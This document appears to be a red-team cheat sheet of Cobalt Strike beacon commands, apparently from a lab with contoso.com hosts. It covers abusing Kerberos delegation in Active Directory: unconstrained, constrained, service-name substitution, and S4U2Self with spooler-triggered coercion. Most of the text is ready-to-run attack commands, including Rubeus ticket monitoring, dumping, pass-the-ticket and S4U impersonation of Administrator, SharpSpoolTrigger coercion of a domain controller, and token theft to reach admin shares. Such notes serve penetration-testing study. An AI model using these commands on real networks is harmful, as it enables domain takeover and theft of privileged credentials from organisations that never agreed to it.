## Unconstrained Delegation

- How to identify it
```powershell
beacon> ldapsearch "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname


#Significa que un admin en WS puede pivotar a DC si saca TGT de algun admin.
sAMAccountName: LON-DC-1$
--------------------
sAMAccountName: LON-WS-1$
```

### ⚔️ How to exploit it?

> **Have local admin access**
>**Wait for a privileged user to connect**, such as a Domain Admin.
>Use Rubeus to capture their TGT from memory:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64ticket>

#Stop Rubeus
beacon> jobs
beacon> jobkill 0
```

## Constrained Delegation

- How to identify it
```powershell
beacon> ldapsearch "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))" --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
```

### ⚔️ How to exploit it?

> **Have local admin access**

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

#Obtain the TGT of ws-1
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:<TGT_kirbi> /impersonateuser:Administrator /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<ticket_kirbi>

#Stop Rubeus
beacon> steal_token <PID>
beacon> ls \\lon-fs-1\c$
```


## Service Change

- It is the same as CONSTRAINED, but changing the service to allow pivoting.
```powershell
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: time/lon-dc-1.contoso.com, time/lon-dc-1
```

### ⚔️ How to exploit it?
> **Have local admin access**

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

#Obtain the TGT of ws-1
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[TGT] /impersonateuser:Administrator /nowrap


beacon>execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]

#Stop Rubeus
beacon> steal_token <PID>
beacon> ls \\lon-fs-1\c$
```


## S4u2Self

- It is the same as UNCONSTRAINED, but forces the connection to our monitor mode.
```powershell
beacon> ldapsearch "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

#From the middle beacon, force this authentication until the one from dc-1 appears
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

### ⚔️ How to exploit it?
> **Have local admin access**

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[TGT_base64] /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:[CIFS TICKET]


beacon> run klist
beacon> ls \\lon-dc-1\c$
```
